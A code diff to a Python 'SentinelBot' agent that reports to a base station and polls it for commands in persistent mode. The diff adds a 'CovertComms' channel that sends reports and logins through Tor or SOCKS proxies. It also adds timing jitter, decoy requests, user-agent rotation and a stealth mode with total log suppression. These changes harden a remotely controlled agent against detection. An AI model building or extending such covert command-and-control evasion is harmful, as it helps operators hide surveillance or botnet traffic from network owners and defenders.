@@ -45,6 +45,8 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 
+from network_guardian.agent.covert_comms import CovertComms, build_comms
+
 logger = logging.getLogger("ng-sentinel")
 
 _SENTINEL_DIR = Path.home() / ".ng_agent" / "sentinel"
@@ -740,12 +742,16 @@ class SentinelBot:
     """
 
     def __init__(self, base_url: str, fleet_key: str,
-                 agent_id: str = "", label: str = "") -> None:
+                 agent_id: str = "", label: str = "",
+                 comms: CovertComms | None = None) -> None:
         self._base_url = base_url.rstrip("/")
         self._fleet_key = fleet_key
         self._agent_id = agent_id
         self._label = label or socket.gethostname()
         self._started_at = 0.0
+
+        # Covert communications channel (anonymized HTTP)
+        self._comms = comms or build_comms()
 
         # Sub-systems
         self.wifi = WiFiWatcher()
@@ -973,27 +979,21 @@ class SentinelBot:
                 await asyncio.sleep(30)
 
     def _send_report(self, report: dict) -> bool:
-        """Send report to base station."""
+        """Send report to base station via the covert channel."""
         url = f"{self._base_url}/api/fleet/report"
         payload = json.dumps(report).encode()
         sig = hmac.new(self._fleet_key.encode(), payload, hashlib.sha256).hexdigest()
 
-        req = urllib.request.Request(
-            url, data=payload, method="POST",
-            headers={
-                "Content-Type": "application/json",
-                "X-Agent-ID": self._agent_id,
-                "X-Agent-Signature": sig,
-                "X-Requested-With": "XMLHttpRequest",
-            },
-        )
-        try:
-            with urllib.request.urlopen(req, timeout=15) as resp:
-                body = json.loads(resp.read())
-                return body.get("ok", False)
-        except Exception as e:
-            logger.error("Phone-home failed: %s", e)
-            return False
+        headers = {
+            "Content-Type": "application/json",
+            "X-Agent-ID": self._agent_id,
+            "X-Agent-Signature": sig,
+            "X-Requested-With": "XMLHttpRequest",
+        }
+        ok, body = self._comms.post(url, headers, payload)
+        if ok:
+            return body.get("ok", False)
+        return False
 
     def _check_commands(self) -> None:
         """Check base station for pending commands (strategy overrides, etc)."""
@@ -1054,9 +1054,14 @@ def _register(base_url: str, fleet_key: str, agent_id: str) -> bool:
 # CLI
 # ---------------------------------------------------------------------------
 
-async def run_sentinel(base_url: str, fleet_key: str, agent_id: str) -> None:
+async def run_sentinel(base_url: str, fleet_key: str, agent_id: str,
+                       comms: CovertComms | None = None) -> None:
     """Main async entry point."""
-    bot = SentinelBot(base_url, fleet_key, agent_id=agent_id)
+    bot = SentinelBot(base_url, fleet_key, agent_id=agent_id, comms=comms)
+    status = bot._comms.status()
+    logger.info("Covert channel: proxy=%s, jitter=%s, decoys=%d, ua-rotation=%s",
+                status["proxy"], status["jitter"],
+                status["decoys"], status["user_agent_rotation"])
     await bot.start()
     try:
         await asyncio.Event().wait()
@@ -1080,6 +1085,22 @@ def main():
     parser.add_argument("--password", "-p",
                         help="Wolfpak password (or prompted interactively)")
     parser.add_argument("--verbose", "-v", action="store_true")
+    parser.add_argument(
+        "--proxy",
+        help="Proxy URL for covert routing (e.g. socks5://127.0.0.1:9050, http://proxy:8080)",
+    )
+    parser.add_argument(
+        "--tor", action="store_true",
+        help="Route via Tor (auto-detect SOCKS5 on 9050/9150)",
+    )
+    parser.add_argument(
+        "--stealth", action="store_true",
+        help="Maximum stealth: long jitter, extra decoys, total log suppression",
+    )
+    parser.add_argument(
+        "--no-jitter", action="store_true",
+        help="Disable random timing delays (faster but more detectable)",
+    )
 
     args = parser.parse_args()
     logging.basicConfig(
@@ -1087,7 +1108,15 @@ def main():
         format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
     )
 
-    # Authenticate
+    # Build covert comms channel
+    comms = build_comms(
+        proxy=args.proxy or "",
+        use_tor=args.tor,
+        jitter=not args.no_jitter,
+        stealth=args.stealth,
+    )
+
+    # Authenticate (also through covert channel)
     auth = _authenticate(args.base, args.key, args.username, args.password)
     logger.info("Operator: %s | Role: %s",
                 auth.get("operator"), auth.get("role"))
@@ -1096,8 +1125,10 @@ def main():
     agent_id = _get_agent_id()
     _register(args.base, args.key, agent_id)
 
-    logger.info("Sentinel bot %s starting in persistent mode...", agent_id)
-    asyncio.run(run_sentinel(args.base, args.key, agent_id))
+    cs = comms.status()
+    logger.info("Sentinel bot %s starting | covert: proxy=%s jitter=%s stealth=%s",
+                agent_id, cs["proxy"], cs["jitter"], args.stealth)
+    asyncio.run(run_sentinel(args.base, args.key, agent_id, comms=comms))
 
 
 if __name__ == "__main__":
